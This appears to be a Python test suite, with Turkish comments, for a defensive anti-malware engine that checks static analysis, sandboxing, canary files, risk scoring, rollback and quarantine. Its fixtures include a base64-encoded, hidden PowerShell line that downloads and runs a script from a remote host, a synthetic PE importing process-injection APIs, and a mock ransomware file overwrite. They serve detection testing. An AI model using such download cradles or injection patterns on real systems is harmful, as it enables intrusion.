#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AEGIS-VORTEX :: 6 Katmanlı Otonom Savunma ve Geri Sarma Motoru Uçtan Uca Doğrulama Süiti
Tüm 6 modül + Modül 7 Öz-Koruma & AES-256-GCM Karantina gerçek dosya, gerçek PE IAT,
gerçek Win32 JobObject ve gerçek alt süreç (PID) sonlandırma + LIFO Rollback üzerinde test edilir.
"""

import base64
import hashlib
import os
import shutil
import struct
import subprocess
import sys
import tempfile
import time

VORTEX_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if VORTEX_ROOT not in sys.path:
    sys.path.insert(0, VORTEX_ROOT)

from modules.m1_static_pe_analyzer import FuzzyHasher
from modules.m5_risk_barometer import RiskSignal
from vortex_engine import AegisVortexEngine


def build_synthetic_pe64_with_iat(dll_name: bytes, api_names: list[bytes]) -> bytes:
    """
    Test için disk üzerinde geçerli bir 64-bit PE32+ ikili oluşturur:
    .text bölümü + .idata (Import Directory Table + INT + Hint/Name Table) içerir.
    """
    buf = bytearray(0x800)
    buf[0:2] = b"MZ"
    struct.pack_into("<I", buf, 0x3C, 0x80)
    buf[0x80:0x84] = b"PE\x00\x00"
    # COFF Header: Machine=x64(0x8664), NumSections=2, OptHeaderSize=0xF0
    struct.pack_into("<HHIIIHH", buf, 0x84, 0x8664, 2, 0, 0, 0, 0xF0, 0x0022)
    # Optional Header PE32+ Magic = 0x20B
    opt_off = 0x98
    struct.pack_into("<H", buf, opt_off, 0x20B)
    # DataDirectory[1] (Import Table): RVA = 0x2000, Size = 40
    struct.pack_into("<II", buf, opt_off + 112 + 8, 0x2000, 40)

    # Section 1: .text (VAddr=0x1000, RawPtr=0x200, RawSize=0x200)
    sec1 = opt_off + 0xF0
    buf[sec1:sec1 + 8] = b".text\x00\x00\x00"
    struct.pack_into("<IIII", buf, sec1 + 8, 0x200, 0x1000, 0x200, 0x200)

    # Section 2: .idata (VAddr=0x2000, RawPtr=0x400, RawSize=0x400)
    sec2 = sec1 + 40
    buf[sec2:sec2 + 8] = b".idata\x00\x00"
    struct.pack_into("<IIII", buf, sec2 + 8, 0x400, 0x2000, 0x400, 0x400)

    # .idata layout at file offset 0x400 (RVA 0x2000):
    # IDT[0] at 0x400 (20 bytes), IDT[1] null terminator at 0x414
    # INT (OriginalFirstThunk) at 0x440 (RVA 0x2040)
    # DLL name at 0x480 (RVA 0x2080)
    # Hint/Name entries starting at 0x4A0 (RVA 0x20A0)
    struct.pack_into("<IIIII", buf, 0x400, 0x2040, 0, 0, 0x2080, 0x2040)
    buf[0x480:0x480 + len(dll_name)] = dll_name + b"\x00"

    hn_cursor_off = 0x4A0
    for idx, api in enumerate(api_names):
        rva = 0x2000 + (hn_cursor_off - 0x400)
        struct.pack_into("<Q", buf, 0x440 + idx * 8, rva)
        struct.pack_into("<H", buf, hn_cursor_off, idx + 1)
        buf[hn_cursor_off + 2: hn_cursor_off + 2 + len(api)] = api + b"\x00"
        hn_cursor_off += 2 + len(api) + 2

    return bytes(buf)


def run_all_tests() -> None:
    temp_ws = tempfile.mkdtemp(prefix="aegis_vortex_test_")
    canary_dir = os.path.join(temp_ws, "UserDocuments")
    user_work_dir = os.path.join(temp_ws, "UserWork")
    os.makedirs(canary_dir, exist_ok=True)
    os.makedirs(user_work_dir, exist_ok=True)

    engine = AegisVortexEngine(workspace_root=temp_ws, canary_dirs=[canary_dir])

    try:
        print("=== [1/7] MODÜL 1: Fuzzy Hash, Shannon Entropi, PE IAT & AST/Base64 Testi ===")
        import random
        rng = random.Random(2026)
        base_code = bytes(rng.getrandbits(8) for _ in range(6144))
        sample_a = base_code[:3000] + b"\x90\x90\xCC\xC3" + base_code[3000:]
        sample_b = base_code[:3000] + b"\x41\x42\x43\x44\x45\x46" + base_code[3006:]
        fuzzy_a = FuzzyHasher.compute(sample_a)
        fuzzy_b = FuzzyHasher.compute(sample_b)
        sim = FuzzyHasher.similarity(fuzzy_a, fuzzy_b)
        assert sim >= 75.0, f"Fuzzy hash mutasyon benzerliği düşük: {sim}"

        engine.static_analyzer.register_known_malware("Trojan.VariantTest", fuzzy_sig=fuzzy_a)
        mutated_path = os.path.join(user_work_dir, "mutated_dropper.bin")
        with open(mutated_path, "wb") as f:
            f.write(sample_b)
        rep_mut = engine.static_analyzer.analyze_file(mutated_path)
        assert rep_mut.fuzzy_match and rep_mut.fuzzy_match["similarity_percent"] >= 75.0

        # Yüksek entropi testi (> 7.2)
        packed_path = os.path.join(user_work_dir, "packed_encrypted.bin")
        with open(packed_path, "wb") as f:
            f.write(os.urandom(16384))
        rep_packed = engine.static_analyzer.analyze_file(packed_path)
        assert rep_packed.overall_entropy > 7.2 and rep_packed.packed_or_obfuscated

        # Sentetik PE64 + IAT Injection Üçlüsü
        pe_bytes = build_synthetic_pe64_with_iat(
            b"kernel32.dll",
            [b"VirtualAllocEx", b"WriteProcessMemory", b"CreateRemoteThread"],
        )
        pe_path = os.path.join(user_work_dir, "injector_sample.exe")
        with open(pe_path, "wb") as f:
            f.write(pe_bytes)
        rep_pe = engine.static_analyzer.analyze_file(pe_path)
        assert rep_pe.is_pe and rep_pe.process_injection_flag, "PE IAT enjeksiyon üçlüsü yakalanamadı!"

        # Gerçek Windows notepad.exe üzerinde PE + İmza + IAT doğrulaması
        rep_np = engine.static_analyzer.analyze_file(r"C:\Windows\System32\notepad.exe")
        assert rep_np.is_pe and rep_np.is_signed and len(rep_np.imported_dlls) > 0

        # Betik Base64 + Regex + AST
        ps_inner = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://198.51.100.5/a.ps1'); AmsiUtils"
        b64_ps = base64.b64encode(ps_inner.encode("utf-16le")).decode("ascii")
        ps_path = os.path.join(user_work_dir, "encoded_loader.ps1")
        with open(ps_path, "w", encoding="utf-8") as f:
            f.write(f"powershell.exe -WindowStyle Hidden -EncodedCommand {b64_ps}\n")
        rep_ps = engine.static_analyzer.analyze_file(ps_path)
        assert len(rep_ps.decoded_payloads) >= 1 and len(rep_ps.script_findings) >= 3
        print(f"OK -> FuzzySim={sim}% | PackedEnt={rep_packed.overall_entropy} | PE_IAT_Injection={rep_pe.process_injection_flag} | NotepadSigned={rep_np.is_signed} | ScriptFindings={len(rep_ps.script_findings)}")

        print("=== [2/7] MODÜL 2: Gölge Kafes (500ms JobObject + Sleep-Patching + Anti-VM) ===")
        cage_script = os.path.join(user_work_dir, "sleeper_dropper.py")
        with open(cage_script, "w", encoding="utf-8") as f:
            f.write(
                "import os, time\n"
                "time.sleep(600)\n"
                "with open(os.path.join(os.environ['USERPROFILE'], 'Desktop', 'budget_report.txt'), 'w') as out:\n"
                "    out.write('ENCRYPTED_BY_RANSOM')\n"
                "with open(os.path.join(os.environ['USERPROFILE'], 'dropped.txt'), 'w') as d:\n"
                "    d.write('dropper')\n"
            )
        det_rep = engine.shadow_cage.detonate(cage_script, observation_ms=500)
        assert det_rep.sleep_calls_patched >= 1
        assert det_rep.observation_ms < 2500
        assert any("budget_report.txt" in p for p in det_rep.files_modified)
        print(f"OK -> SleepPatched={det_rep.sleep_calls_patched} | ObsMs={det_rep.observation_ms}ms | Modified={det_rep.files_modified}")

        print("=== [3/7] MODÜL 3: Soy Ağacı (CreateToolhelp32Snapshot + Kural A/B LOLBins) ===")
        graph = engine.lineage_monitor.build_lineage_graph()
        assert len(graph) > 10
        rule_a = engine.lineage_monitor.evaluate_process_pair("winword.exe", "powershell.exe", 99991, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", 88881)
        rule_b = engine.lineage_monitor.evaluate_process_pair("cmd.exe", "svchost.exe", 99992, r"C:\Users\Public\svchost.exe", 77771)
        assert len(rule_a) == 1 and rule_a[0]["rule"] == "RULE_A_LOLBIN_SPAWN"
        assert len(rule_b) == 1 and rule_b[0]["rule"] == "RULE_B_SYSTEM_MASQUERADE"
        print(f"OK -> LiveProcesses={len(graph)} | RuleA_Triggered={rule_a[0]['rule']} | RuleB_Triggered={rule_b[0]['rule']}")

        print("=== [4/7] MODÜL 4: Canary Honeypot + NtSuspendProcess Anında Dondurma ===")
        deployed = engine.canary_grid.deploy_canaries()
        assert len(deployed) == 3
        target_canary = [p for p in deployed if p.endswith("!_00_aegis_vault.docx")][0]

        # Gerçek bir sahte fidye alt süreci başlat ve canary'ye 1 byte yazarak anında dondurma+imhayı doğrula
        dummy_ransom = subprocess.Popen(["python", "-c", "import time; time.sleep(60)"])
        assert dummy_ransom.poll() is None
        with open(target_canary, "ab") as cf:
            cf.write(b"X")
        tripped = engine.canary_grid.verify_integrity_once(suspect_pid=dummy_ransom.pid)
        time.sleep(0.2)
        assert len(tripped) >= 1 and dummy_ransom.poll() is not None, "Canary tetiklenen süreç dondurulup sonlandırılmalıydı!"
        print(f"OK -> CanaryDeployed={len(deployed)} | Tripped={os.path.basename(tripped[0])} | RansomPID={dummy_ransom.pid} ExitCode={dummy_ransom.returncode}")

        print("=== [5/7 & 6/7] MODÜL 5 (0-100 Risk Barometresi) + MODÜL 6 (Atomik Zaman Makinesi LIFO Rollback) + MODÜL 7 (.aegis_q AES-256) ===")
        # Kurban kullanıcı dosyası oluştur
        victim_doc = os.path.join(user_work_dir, "musteri_veritabani.txt")
        original_content = b"MUSTERI_ID=1042; BAKIYE=98500.00 TL; DURUM=ORIJINAL\n"
        with open(victim_doc, "wb") as f:
            f.write(original_content)

        # Zararlı çalıştırılabilir hedef kopya (Temp altından çalışıyormuş gibi)
        temp_exec_dir = os.path.join(user_work_dir, "AppData", "Local", "Temp")
        os.makedirs(temp_exec_dir, exist_ok=True)
        rogue_exe = os.path.join(temp_exec_dir, "rogue_agent.exe")
        with open(rogue_exe, "wb") as f:
            f.write(pe_bytes)
        rogue_sha_before = hashlib.sha256(pe_bytes).hexdigest()

        rogue_proc = subprocess.Popen(["python", "-c", "import time; time.sleep(60)"])
        pid = rogue_proc.pid

        # Aşama 1 (Skor = 30 -> Zaman Makinesi aktif edilir)
        engine.risk_barometer.add_signal(pid, RiskSignal.UNSIGNED_EXECUTABLE, executable_path=rogue_exe)  # +15 + Temp(+15) = 30
        prof1 = engine.risk_barometer.get_profile(pid)
        assert prof1.score == 30 and prof1.tier == "MONITORED"
        assert engine.time_machine.is_journaling_enabled(pid)

        # Süreç 30+ iken dosya değiştirme ve yeni dropper bırakma işlemleri Copy-on-Write ile kaydedilir
        engine.time_machine.record_file_operation(pid, "MODIFY", victim_doc)
        with open(victim_doc, "wb") as f:
            f.write(b"CORRUPTED_ENCRYPTED_BY_ROGUE_PROCESS_XXXX")

        dropper_artifact = os.path.join(user_work_dir, "dropper_kalinti.dll")
        with open(dropper_artifact, "wb") as f:
            f.write(b"DROPPED_PAYLOAD")
        engine.time_machine.record_file_operation(pid, "CREATE", dropper_artifact)

        # Aşama 2 (Skor = 55 -> Gri Liste: CPU önceliği IDLE + Ağ kısıtlama)
        engine.risk_barometer.add_signal(pid, RiskSignal.HIGH_ENTROPY, executable_path=rogue_exe)  # +25 -> 55
        prof2 = engine.risk_barometer.get_profile(pid)
        assert prof2.score == 55 and prof2.tier == "RESTRICTED" and prof2.priority_lowered and prof2.network_blocked

        # Aşama 3 (Skor = 100 -> Dondur, Dump Al, Sonlandır, .aegis_q Karantina + LIFO Rollback)
        engine.risk_barometer.add_signal(pid, RiskSignal.MEMORY_INJECTION_OR_HOOK, executable_path=rogue_exe)  # +45 -> 100
        time.sleep(0.2)
        prof3 = engine.risk_barometer.get_profile(pid)
        assert prof3.score == 100 and prof3.tier == "CRITICAL" and prof3.terminated
        assert rogue_proc.poll() is not None, "Kritik PID sonlandırılmalıydı!"
        assert not os.path.exists(rogue_exe), "Zararlı EXE orijinal yerinden .aegis_q kasasına taşınmalıydı!"
        assert not os.path.exists(dropper_artifact), "LIFO Rollback dropper dosyasını silmeliydi!"

        with open(victim_doc, "rb") as f:
            restored_bytes = f.read()
        assert restored_bytes == original_content, "LIFO Rollback değiştirilen kullanıcı dosyasını baytı baytına geri yüklemeliydi!"

        # Karantina .aegis_q kontrolü ve geri kurtarma testi
        q_items = engine.vault.list_quarantine()
        assert len(q_items) == 1 and q_items[0]["vault_path"].endswith(".aegis_q") and q_items[0]["pe_corrupted"]
        with open(q_items[0]["vault_path"], "rb") as qf:
            q_raw = qf.read()
        assert q_raw[:2] != b"MZ", "Karantina dosyası şifreli ve PE başlığı bozulmuş olmalı!"

        restored_exe = engine.vault.restore_file(q_items[0]["id"])
        assert restored_exe and os.path.isfile(restored_exe)
        with open(restored_exe, "rb") as rf:
            assert hashlib.sha256(rf.read()).hexdigest() == rogue_sha_before

        # Anti-Tamper testi
        tamper_blocked = engine.vault.deny_external_tamper_attempt(actor_pid=99999, target_path_or_pid=str(os.getpid()))
        assert tamper_blocked

        bus_history = engine.bus.get_history(limit=50)
        print(f"OK -> FinalScore={prof3.score} | RollbackRestored={len(prof3.rollback_summary['files_restored'])} | RollbackDeleted={len(prof3.rollback_summary['files_deleted'])} | VaultItems=1 (.aegis_q AES-256-GCM) | EventBusPackets={len(bus_history)}")
        print("\nTÜM 6+1 KATMANLI AEGIS-VORTEX DOĞRULAMA TESTLERİ BAŞARIYLA GEÇTİ!")
    finally:
        engine.canary_grid.cleanup_canaries()
        engine.stop()
        shutil.rmtree(temp_ws, ignore_errors=True)


if __name__ == "__main__":
    run_all_tests()
